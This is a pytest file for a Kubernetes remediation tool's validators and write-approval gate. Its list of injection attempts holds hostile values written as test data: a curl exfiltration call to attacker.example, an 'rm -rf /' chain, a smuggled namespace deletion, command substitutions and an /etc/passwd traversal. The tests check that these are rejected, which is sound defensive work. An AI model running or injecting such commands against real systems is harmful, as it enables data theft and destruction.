"""Guardrail tests for the shared validators and remediation write gate."""

from __future__ import annotations

import pytest

from tools.common import (
    PROTECTED_NAMESPACES,
    assert_namespace_not_protected,
    require_remediation_approval,
    validate_k8s_name,
    validate_namespace,
)

INJECTION_ATTEMPTS = [
    "default; curl attacker.example/exfil",
    "default && rm -rf /",
    "default | tee /tmp/x",
    "$(whoami)",
    "`id`",
    "default\nkubectl delete ns default",
    "../../etc/passwd",
    "Default",
    "",
    "a" * 64,
]


@pytest.mark.parametrize("value", INJECTION_ATTEMPTS)
def test_validate_namespace_rejects_unsafe_values(value):
    with pytest.raises(ValueError):
        validate_namespace(value)


@pytest.mark.parametrize("value", ["default", "kube-system", "phonebook", "a", "a-b-c-1"])
def test_validate_namespace_accepts_valid_labels(value):
    validate_namespace(value)


@pytest.mark.parametrize("value", [*INJECTION_ATTEMPTS[:-1], "a" * 254])
def test_validate_k8s_name_rejects_unsafe_values(value):
    with pytest.raises(ValueError):
        validate_k8s_name(value, "pod")


@pytest.mark.parametrize(
    "value",
    ["web-1", "command-6895d52b2d484349bb0f5a787848f846", "aks-nodepool1-12345678-vmss000000", "my.node.name"],
)
def test_validate_k8s_name_accepts_valid_names(value):
    validate_k8s_name(value, "pod")


@pytest.mark.parametrize("namespace", sorted(PROTECTED_NAMESPACES))
def test_protected_namespaces_are_refused(namespace):
    with pytest.raises(PermissionError):
        assert_namespace_not_protected(namespace)


def test_aks_command_namespace_is_protected():
    # AKS Run Command's own pods live here; remediation must never touch them.
    assert "aks-command" in PROTECTED_NAMESPACES


def test_unprotected_namespace_passes():
    assert_namespace_not_protected("phonebook")


def test_approval_requires_full_check_mode(monkeypatch):
    monkeypatch.setenv("AKS_REMEDIATION_ENABLE_WRITE", "true")
    with pytest.raises(PermissionError, match="check_mode='full'"):
        require_remediation_approval("quick", None, "phonebook")


def test_approval_requires_write_env_gate(monkeypatch):
    monkeypatch.delenv("AKS_REMEDIATION_ENABLE_WRITE", raising=False)
    with pytest.raises(PermissionError, match="AKS_REMEDIATION_ENABLE_WRITE"):
        require_remediation_approval("full", None, "phonebook")


def test_write_passes_without_approval_token(monkeypatch):
    monkeypatch.setenv("AKS_REMEDIATION_ENABLE_WRITE", "true")
    monkeypatch.delenv("AKS_REMEDIATION_APPROVAL_TOKEN", raising=False)
    require_remediation_approval("full", None, "phonebook")


def test_protected_namespace_still_rejected(monkeypatch):
    monkeypatch.setenv("AKS_REMEDIATION_ENABLE_WRITE", "true")
    with pytest.raises(PermissionError, match="protected"):
        require_remediation_approval("full", None, "kube-system")


def test_destructive_requires_explicit_confirmation(monkeypatch):
    monkeypatch.setenv("AKS_REMEDIATION_ENABLE_WRITE", "true")
    with pytest.raises(PermissionError, match="confirm_destructive"):
        require_remediation_approval("full", None, "phonebook", is_destructive=True)


def test_destructive_passes_with_confirmation(monkeypatch):
    monkeypatch.setenv("AKS_REMEDIATION_ENABLE_WRITE", "true")
    require_remediation_approval(
        "full", None, "phonebook", is_destructive=True, confirm_destructive=True
    )
